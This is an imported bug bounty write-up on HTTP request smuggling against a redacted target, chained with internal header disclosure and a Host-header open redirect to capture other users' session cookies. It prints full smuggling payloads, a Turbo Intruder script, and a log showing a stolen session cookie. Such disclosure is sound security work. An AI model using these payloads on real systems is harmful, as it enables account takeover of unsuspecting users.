---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-01-03_account-takeover-via-http-request-smuggling.md
original_filename: 2020-01-03_account-takeover-via-http-request-smuggling.md
title: Account takeover via HTTP Request Smuggling
category: documents
detected_topics:
- idor
- command-injection
- race-condition
- api-security
- supply-chain
tags:
- imported
- documents
- idor
- command-injection
- race-condition
- api-security
- supply-chain
language: en
raw_sha256: 78ac0cf8e248f190c4d0852b243b6aa8536360a2a6337d77625427f21691e129
text_sha256: ccf05d25a18f0db3fbbc423c972ddadc6e62847ae5186a2248e015ce059dc981
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: true
---

# Account takeover via HTTP Request Smuggling

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-01-03_account-takeover-via-http-request-smuggling.md
- Source Type: markdown
- Detected Topics: idor, command-injection, race-condition, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: True
- Raw SHA256: `78ac0cf8e248f190c4d0852b243b6aa8536360a2a6337d77625427f21691e129`
- Text SHA256: `ccf05d25a18f0db3fbbc423c972ddadc6e62847ae5186a2248e015ce059dc981`


## Content

---
title: "Account takeover via HTTP Request Smuggling"
page_title: "Account takeover via HTTP Request Smuggling - hipotermia"
url: "https://hipotermia.pw/bb/http-desync-account-takeover"
final_url: "https://hipotermia.pw/bb/http-desync-account-takeover"
authors: ["hipotermia (@_hipotermia_)"]
bugs: ["HTTP request smuggling", "Account takeover", "Open redirect", "Internal header disclosure"]
publication_date: "2020-01-03"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4845
---

# Account takeover via HTTP Request Smuggling

[Tweet](https://twitter.com/share?ref_src=twsrc%5Etfw)

03/01/2020

This is my second write-up about detecting and exploiting **HTTP Request Smuggling** by chaining different bugs with it to get critical vulnerabilities, you can find my first write-up here: [HTTP Request Smuggling + IDOR](http-desync-idor).

This time I faced a vulnerable `TE.CL` system and by chaining an **internal header disclosure** and an **open redirect** I was able to get an **account takeover** of any user.

Everything is redacted and highly modified to not disclose this bug bounty program's information.

Detection Internal Header Disclosure Open Redirect Account Takeover

* * *

## Detection

As in most of these kind of vulnerabilities, everything started thanks to [Burp's Request Smuggler plugin](https://github.com/PortSwigger/http-request-smuggler).

![](/static/img/bb/http-desync-account-takeover/1.png)

The first thing to do here is confirm if the system is indeed vulnerable.

This time I was facing a supposedly `TE.CL` vulnerable system, so I used a request like this one to test the behavior.
  
  
  POST / HTTP/1.1
  Host: xxx.com
  Content-Length: 4
  Transfer-Encoding : chunked
  
  46
  POST /nothing HTTP/1.1
  Host: xxx.com
  Content-Length: 15
  
  kk
  0
  
  

If the system is vulnerable, this is what would happen:

* The **front-end** uses the `Transfer-Encoding` header, therefore sees a chunk of `46` (hex) characters and a `0` to determine the end of it. Everything correct so it forwards the request to the back-end.
* The **back-end** uses the `Content-Length` header instead, which is `4`, then it only processes the `46\r\n` characters and returns a `200` response to this request.
![](/static/img/bb/http-desync-account-takeover/2.png)
* The remaining part (`POST /nothing...`) is processed with the following request received by the back-end.
* Therefore, this next request is appended to my request body, and whoever sent it will receive a different response.
![](/static/img/bb/http-desync-account-takeover/3.png)

This behavior can be simulated with the following Turbo Intruder script:
  
  
  def queueRequests(target, wordlists):
  engine = RequestEngine(endpoint=target.endpoint,
  concurrentConnections=5,
  requestsPerConnection=1,
  resumeSSL=False,
  timeout=10,
  pipeline=False,
  maxRetriesPerRequest=0,
  engine=Engine.THREADED,
  )
  engine.start()
  
  attack = '''POST / HTTP/1.1
  Host: xxx.com
  Content-Length: 4
  Transfer-Encoding : chunked
  
  46
  POST /nothing HTTP/1.1
  Host: xxx.com
  Content-Length: 15
  
  kk
  0
  
  '''
  engine.queue(attack)
  
  victim = '''GET / HTTP/1.1
  Host: xxx.com
  
  '''
  for i in range(14):
  engine.queue(victim)
  time.sleep(0.05)
  
  
  def handleResponse(req, interesting):
  table.add(req)
  

Which resulted in the following responses.

First, the payload is sent.

![](/static/img/bb/http-desync-account-takeover/4.png)

A simple `GET` receives a `200`.

![](/static/img/bb/http-desync-account-takeover/5.png)

But the modified request, which should be identical to the others, receives the "malicious" response of `/nothing`, `404`.

![](/static/img/bb/http-desync-account-takeover/6.png)

The vulnerability was confirmed, next I needed to find a way to exploit it.

## Internal Header Disclosure

The same site had a login panel which generated the following request when a login attempt occurred.
  
  
  POST /login HTTP/1.1
  Host: xxx.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 75
  
  onerror=invalid.html&onsuccess=account.html&username=admin&password=***REDACTED***
  

The body data has four parameters, `onerror` which is the page where the user is redirected if the credentials are invalid, `onsuccess` when the credentials are valid, `username` and `password`.

Making an unsuccessful attempt resulted in a redirection to `invalid.html`.
  
  
  HTTP/1.1 302 Found
  Date: Thu, 2 Jan 2020 20:59:32 GMT
  Content-Type: text/plain
  Connection: close
  Location: http://xxx.com/invalid.html
  Content-Length: 0
  

Since I was able to control where the redirection was made by changing the `onerror` value, if I changed the order of the parameters by putting it at the end of the body, I was able to reflect the following request on the response, allowing me to read possible headers being added internally.

The "malicious" request is the following.
  
  
  POST / HTTP/1.1
  Host: xxx.com
  Content-Length: 4
  Transfer-Encoding : chunked
  
  AE
  POST /login HTTP/1.1
  Host: xxx.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 300
  
  onsuccess=account.html&username=admin&password=***REDACTED***
  0
  
  

You have to play with the payload `Content-Length` value in order to retrieve the whole following request.

And this would be expected behavior.

![](/static/img/bb/http-desync-account-takeover/7.png)

Note how even having a newline, the next request (`GET /...`) is part of the `onerror` value.

Then, the response of that `GET` request is the following redirection, where the path contains the full request with its internal headers.
  
  
  HTTP/1.1 302 Found
  Date: Thu, 2 Jan 2020 20:59:32 GMT
  Content-Type: text/plain
  Connection: close
  Location: http://xxx.com/**kk  0  GET /%20HTTP/1.1%0D%0AHost:%20xxx.com%0D%0AX-Forwarded-For:%20184.173.141.231%0D%0Ax-foo:%20blabla%0D%0A**
  Content-Length: 0
  

In my case I didn't got any important information, just a `X-Forwarded-For` containing the IP address the request was sent from.
  
  
  GET / HTTP/1.1
  Host: xxx.com
  X-Forwarded-For: 184.173.141.231
  x-foo: blabla
  

## Open Redirect

Since the Internal Header Disclosure wasn't enough, I tried to look for other ways to exploit the HTTP Request Smuggling and I found the same site was also vulnerable to Host Header poisoning.

This combo allowed me to redirect any user request to a different website just by changing the value of the `Host` header of my payload.
  
  
  POST / HTTP/1.1
  Host: xxx.com
  Content-Length: 4
  Transfer-Encoding : chunked
  
  BF
  POST /login HTTP/1.1
  Host: **malicious.com**
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 75
  
  onerror=invalid.html&onsuccess=account.html&username=admin&password=***REDACTED***
  0
  
  

Then, any request sent just after my payload would receive the following response.
  
  
  HTTP/1.1 302 Found
  Date: Thu, 2 Jan 2020 20:59:32 GMT
  Content-Type: text/plain
  Connection: close
  Location: http://**malicious.com** /invalid.html
  Content-Length: 0
  

This could already be considered a high severity vulnerability, but it's still possible to upgrade it even more by chaining everything together.

## Account Takeover

Using the ability to reflect the next request and the open redirect via the `Host` header I was able to redirect any user to a website controlled by me and then retrieve every header of the original request by using a payload like the following.
  
  
  POST / HTTP/1.1
  Host: xxx.com
  Content-Length: 4
  Transfer-Encoding : chunked
  
  B4
  POST /login HTTP/1.1
  Host: mywebsite.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 100
  
  onsuccess=account.html&username=admin&password=***REDACTED***
  0
  
  

This is the expected behavior, where any next request gets a redirection to my website.

![](/static/img/bb/http-desync-account-takeover/8.png)

Then I just needed to launch the payload till the next request was from an authenticated user and then something like this would appear in my server log.
  
  
  69.65.13.216 - - [02/Jan/2020 21:02:16] "GET /kk%20%200%20%20%20%20GET%20/document/2%20HTTP/1.1%0D0AHost:%20xxx.com%0D0ACookie:%20session=d2104a400c7f629a197f33bb33fe80c0%0D0AX-Forwarded-For:%2069.65.13.216%0D0Ax-foo:%20blabla%0D%0A HTTP/1.1" 404 -
  

Being able to retrieve the original request and steal this user session.
  
  
  GET /document/2 HTTP/1.1
  Host: xxx.com
  Cookie: **session=d2104a400c7f629a197f33bb33fe80c0**
  X-Forwarded-For: 69.65.13.216
  x-foo: blabla
  

I could also make my website redirect the user to the original website which would make the attack almost imperceptible to the victim.
